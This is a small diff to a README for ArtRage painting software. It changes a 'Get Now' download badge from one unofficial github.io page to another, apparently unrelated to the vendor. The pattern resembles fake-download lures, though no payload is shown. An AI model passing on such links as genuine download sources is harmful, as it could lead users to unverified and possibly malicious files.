@@ -4,7 +4,7 @@
   <img src="https://www.artrage.com/wp-content/uploads/2021/08/ArtRage-NavBar.png" alt="ArtRage Painting Software"/>
 </p>
 
-[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://lilbilqeeslilysl.github.io/.github/artrage-painting-software)
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://eliamacostaxbul.github.io/.github/artrage-painting-software)
 
 ---
 
